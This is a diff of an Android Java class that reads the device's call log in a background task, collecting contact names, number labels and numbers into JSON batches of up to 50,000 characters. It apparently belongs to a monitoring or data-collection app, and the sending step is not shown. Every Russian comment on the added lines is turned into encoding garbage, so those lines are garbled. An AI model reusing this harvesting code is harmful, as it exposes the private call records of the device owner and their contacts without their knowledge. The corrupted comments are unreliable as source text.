@@ -34,11 +34,11 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 		version = ValueWork.getMethod(ConstantValue.TYPE_LIST_CALL, mContext);
 		Logging.doLog(LOG_TAG, "readCall" + version, "readCall" + version);
 
-		if (NetworkChangeReceiver.isOnline(mContext)) {
+		if (NetworkChangeReceiver.isOnline(mContext)!= 0) {
 			
 			Cursor callLogCursor = null;
-			// Делаем запрос к контент-провайдеру
-			// и получаем все данные из таблицы
+			// Г„ГҐГ«Г ГҐГ¬ Г§Г ГЇГ°Г®Г± ГЄ ГЄГ®Г­ГІГҐГ­ГІ-ГЇГ°Г®ГўГ Г©Г¤ГҐГ°Гі
+			// ГЁ ГЇГ®Г«ГіГ·Г ГҐГ¬ ГўГ±ГҐ Г¤Г Г­Г­Г»ГҐ ГЁГ§ ГІГ ГЎГ«ГЁГ¶Г»
 
 			complete = "0";
 			callLogCursor = mContext.getContentResolver().query(
@@ -48,17 +48,17 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 			if (callLogCursor != null) {
 				JSONObject archiveCallJson = new JSONObject();
 
-				// Проходим в цикле, пока не дойдём до последней записи
+				// ГЏГ°Г®ГµГ®Г¤ГЁГ¬ Гў Г¶ГЁГЄГ«ГҐ, ГЇГ®ГЄГ  Г­ГҐ Г¤Г®Г©Г¤ВёГ¬ Г¤Г® ГЇГ®Г±Г«ГҐГ¤Г­ГҐГ© Г§Г ГЇГЁГ±ГЁ
 
 				while (callLogCursor.moveToNext()) {
 
-					// Имя контакта
+					// Г€Г¬Гї ГЄГ®Г­ГІГ ГЄГІГ 
 					String name = callLogCursor.getString(callLogCursor
 							.getColumnIndex(CallLog.Calls.CACHED_NAME));
 
 					String cacheNumber = callLogCursor.getString(callLogCursor
 							.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
-					// Номер контакта и т.д.
+					// ГЌГ®Г¬ГҐГ° ГЄГ®Г­ГІГ ГЄГІГ  ГЁ ГІ.Г¤.
 					String number = callLogCursor.getString(callLogCursor
 							.getColumnIndex(CallLog.Calls.NUMBER));
 					// String name = getNumber.getContactName(callLogCursor
@@ -100,7 +100,7 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 							sendStr += "," + archiveCallJson.toString();
 
 					} catch (JSONException e) {
-						// TODO Автоматически созданный блок catch
+						// TODO ГЂГўГІГ®Г¬Г ГІГЁГ·ГҐГ±ГЄГЁ Г±Г®Г§Г¤Г Г­Г­Г»Г© ГЎГ«Г®ГЄ catch
 						e.printStackTrace();
 					}
 					if (sendStr.length() >= 50000) {
@@ -150,7 +150,7 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 
 	@Override
 	protected Void doInBackground(Context... params) {
-		// TODO Автоматически созданная заглушка метода
+		// TODO ГЂГўГІГ®Г¬Г ГІГЁГ·ГҐГ±ГЄГЁ Г±Г®Г§Г¤Г Г­Г­Г Гї Г§Г ГЈГ«ГіГёГЄГ  Г¬ГҐГІГ®Г¤Г 
 		Logging.doLog(LOG_TAG, "doIn");
 		this.mContext = params[0];
 		readCallLogs();
